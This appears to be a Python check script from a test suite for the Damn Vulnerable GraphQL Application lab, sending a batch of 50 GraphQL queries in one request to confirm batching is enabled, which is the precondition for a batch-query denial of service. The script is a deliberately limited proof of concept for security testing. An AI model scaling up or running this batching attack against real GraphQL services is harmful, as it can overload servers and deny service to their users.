#!/usr/bin/env python3
"""
dvga_challenge_09_batch_query_dos.py — DoS via a large GraphQL batch.

DVGA allows batched requests (a JSON array of operations in one POST). A single
client can therefore pack hundreds of operations into one request and force the
server to execute all of them at once — amplifying one HTTP request into a
large burst of internal work.

RELIABLE signal: a batch of N operations returns N result objects in a single
HTTP response. We send a small batch and confirm the server executes every
element (proving batching is enabled), which is the precondition for the DoS.
We keep N small so we do not actually take the lab down.
Run: python3 dvga_challenge_09_batch_query_dos.py [--config ...]
"""
import argparse
import os
import sys

import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import dvga_common as dv


def find_config():
    if os.path.exists("dvga_config.yaml"):
        return "dvga_config.yaml"
    return os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "dvga_config.yaml")


def main():
    ap = argparse.ArgumentParser(description="DoS via large GraphQL batch")
    ap.add_argument("--config", default=find_config())
    args = ap.parse_args()

    cfg = dv.load_config(args.config)
    base = dv.base_url(cfg)
    tout = dv.timeout(cfg)

    url = base + dv.graphql_path(cfg)
    # A batch of 50 cheap operations (kept modest to avoid actually DoS-ing the lab).
    n = 50
    batch = [{"query": "query { users { id username } }"} for _ in range(n)]
    h = dv.consumer_headers(809)
    h.setdefault("Content-Type", "application/json")
    key = os.environ.get("GATEWAY_SUBSCRIPTION_KEY", "").strip()
    if key:
        h["Ocp-Apim-Subscription-Key"] = key

    try:
        r = requests.post(url, json=batch, headers=h, timeout=tout)
    except requests.RequestException as e:
        print(f"batch({n}) -> transport error {e}")
        return

    try:
        body = r.json()
    except Exception:
        body = None

    # A batched response is a JSON ARRAY with one element per operation.
    is_batch = isinstance(body, list)
    executed = len(body) if is_batch else 0
    print(f"batch({n}) -> HTTP {r.status_code} | response_is_array={is_batch} | elements_returned={executed}")
    print()
    if is_batch and executed > 1:
        print(f"[FINDING] GraphQL batching is enabled — one HTTP request executed {executed} operations. "
              "A client can pack arbitrarily many ops per request to amplify load (batch-query DoS).")
    else:
        print("[ok] batching did not execute multiple ops in one response (may be disabled/limited).")


if __name__ == "__main__":
    main()
